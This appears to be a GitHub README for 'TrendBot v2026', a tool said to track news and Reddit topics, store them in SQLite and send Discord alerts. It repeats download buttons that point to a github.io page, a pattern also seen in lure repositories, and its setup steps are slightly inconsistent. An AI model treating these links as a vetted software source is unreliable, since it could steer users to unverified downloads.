# TrendBot v2026 - Trend Monitoring Bot for 2026

> **TrendBot monitors activity around selected topics across news and community sources, identifies notable changes, and presents the results in a local dashboard backed by SQLite with optional Discord notifications.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliverpricexr9581/trendbot-alert-dashboard?style=flat-square)](https://github.com/oliverpricexr9581/trendbot-alert-dashboard)

---

<p align="center">
  <a href="https://oliverpricexr9581.github.io/trendbot-alert-dashboard/">
    <img src="https://img.shields.io/badge/Download-TrendBot%20Latest-brightgreen?style=for-the-badge" alt="Download TrendBot">
  </a>
</p>

> **[Download TrendBot v2026](https://oliverpricexr9581.github.io/trendbot-alert-dashboard/)**

---

[Download Latest Build](https://oliverpricexr9581.github.io/trendbot-alert-dashboard/)

---

## What TrendBot Does

TrendBot is a browser-based monitoring tool for following selected subjects and turning a large volume of source activity into useful signals. It reads Google News RSS and Reddit results for configured topics, saves observations locally in SQLite, and calls attention to activity that rises above its usual level.

The project provides a simple way to watch developing subjects, assess how interest changes over time, and look back at earlier activity. Its local dashboard combines charts with recent observations, while Discord alerts and daily digests reduce the need to check each source by hand.

---

## Capabilities

- Watches Google News RSS for configured topics
- Optionally collects Reddit results for those topics
- Preserves observation history in a local SQLite database
- Finds activity spikes using moving-average comparisons
- Pulls a concise trend phrase from headlines
- Organizes connected headlines into story clusters
- Identifies the leading movers within each category
- Offers basic backtesting for evaluating trend rules
- Delivers notifications through a Discord webhook
- Provides a local web dashboard for charts and recent data
- Creates daily digests for repeated trend summaries

---

## Getting Started

Clone the repository or obtain the project files, then run the application in a local web environment.

1. Download the source:
   - `git clone https://github.com/oliverpricexr9581/trendbot-alert-dashboard.git
   - or download the latest build from the project page
2. Change into the project directory:
   - `cd alert-bot-trendbot`
3. Launch the web application, or serve the local files through the environment you normally use.

For local dashboard use, verify that the data directory and SQLite storage path can be written to before starting the first collection.

---

## Using TrendBot

Configure the topics of interest first. TrendBot can then gather source data and compare new activity with previous observations.

A common operating sequence is:

1. Create or revise the topic list.
2. Run collection for Google News RSS and optionally Reddit.
3. Examine detected spikes and the current top movers.
4. Use the dashboard to explore charts and recent observations.
5. Add a Discord webhook when you want alerts or daily digest messages.
6. Run backtests to see how a trend rule would have performed against existing history.

The dashboard is designed for local inspection of saved trend records and newly collected observations.

---

## Settings

Local configuration controls the topics being followed, storage locations, notification delivery, and analysis options. File names can differ between installations, but settings generally cover the sources to query, webhook information, and database paths.

Common configuration values include:

- Topics to monitor
- Discord webhook URL
- SQLite database path
- Moving-average or spike-detection thresholds
- Digest schedule
- Category and story-clustering preferences

Place configuration files and the SQLite database somewhere writable. TrendBot needs that access to save collection history and dashboard data.

---

## Requirements

- A web-compatible local environment
- Internet access to Google News RSS
- Optional access to Reddit results
- SQLite for storing history
- Discord webhook support when alerts are enabled
- Enough local storage for trend records and logs
- A web browser for opening the dashboard

---

## Frequently Asked Questions

**How can I change the monitored topics?**  
Modify the topic list in the local configuration, then restart the application or collector.

**Where does TrendBot save collected history?**  
Observations are stored in SQLite, allowing older records to be reviewed and used in backtesting.

**How are notifications sent?**  
When spike criteria or other notable changes are identified, TrendBot can post alerts to Discord through a webhook.

**Why is the dashboard empty?**  
Confirm that the collector has executed, that the SQLite location is writable, and that the selected topics produced results.

**Is it possible to examine past behavior?**  
Yes. Backtesting compares trend rules with the history already stored by TrendBot.

**Where can I find newer versions?**  
Check the project page or repository source for new builds and updated project content.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
